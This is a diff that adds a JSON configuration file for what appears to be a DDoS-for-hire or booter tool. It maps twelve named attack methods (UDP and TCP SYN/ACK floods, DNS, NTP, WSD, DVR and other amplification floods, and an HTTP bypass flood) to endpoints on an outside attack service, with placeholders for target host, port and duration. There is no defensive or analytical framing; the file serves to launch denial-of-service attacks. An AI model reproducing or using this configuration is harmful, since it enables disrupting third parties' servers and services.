@@ -1,0 +1,51 @@
+{
+    "pps": {
+        "api": "https://attacks.serverdown.cc/network/layer4?host=$host&port=$port&time=$time&method=UDPPPS",
+        "description": "UDP PPS flood"
+    },
+    "syn": {
+        "api": "https://attacks.serverdown.cc/network/layer4?host=$host&port=$port&time=$time&method=TCPSYN",
+        "description": "TCP SYN flood"
+    },
+    "ack": {
+        "api": "https://attacks.serverdown.cc/network/layer4?host=$host&port=$port&time=$time&method=TCPACK",
+        "description": "TCP ACK flood"
+    },
+    "tfo": {
+        "api": "https://attacks.serverdown.cc/network/layer4?host=$host&port=$port&time=$time&method=TCPTFO",
+        "description": "TCP TFO flood"
+    },
+    "mbx": {
+        "api": "https://attacks.serverdown.cc/network/layer4?host=$host&port=$port&time=$time&method=TCPMB",
+        "description": "TCP Middlebox amplification flood"
+    },
+    "dns": {
+        "api": "https://attacks.serverdown.cc/network/layer4?host=$host&port=$port&time=$time&method=DNS",
+        "description": "DNS amplification flood"
+    },
+    "ntp": {
+        "api": "https://attacks.serverdown.cc/network/layer4?host=$host&port=$port&time=$time&method=NTP",
+        "description": "NTP amplification flood"
+    },
+    "ard": {
+        "api": "https://attacks.serverdown.cc/network/layer4?host=$host&port=$port&time=$time&method=ARD",
+        "description": "ARD amplification flood"
+    },
+    "wsd": {
+        "api": "https://attacks.serverdown.cc/network/layer4?host=$host&port=$port&time=$time&method=WSD",
+        "description": "WSD amplification flood"
+    },
+    "dvr": {
+        "api": "https://attacks.serverdown.cc/network/layer4?host=$host&port=$port&time=$time&method=DVR",
+        "description": "DVR amplification flood"
+    },
+    "sadp": {
+        "api": "https://attacks.serverdown.cc/network/layer4?host=$host&port=$port&time=$time&method=SADP",
+        "description": "SADP amplification flood"
+    },
+    "httpbypass": {
+        "api": "https://attacks.serverdown.cc/network/layer7?target=$host&connections=10&threads=20&duration=$time",
+        "description": "HTTP Bypass flood"
+    }
+}
+  
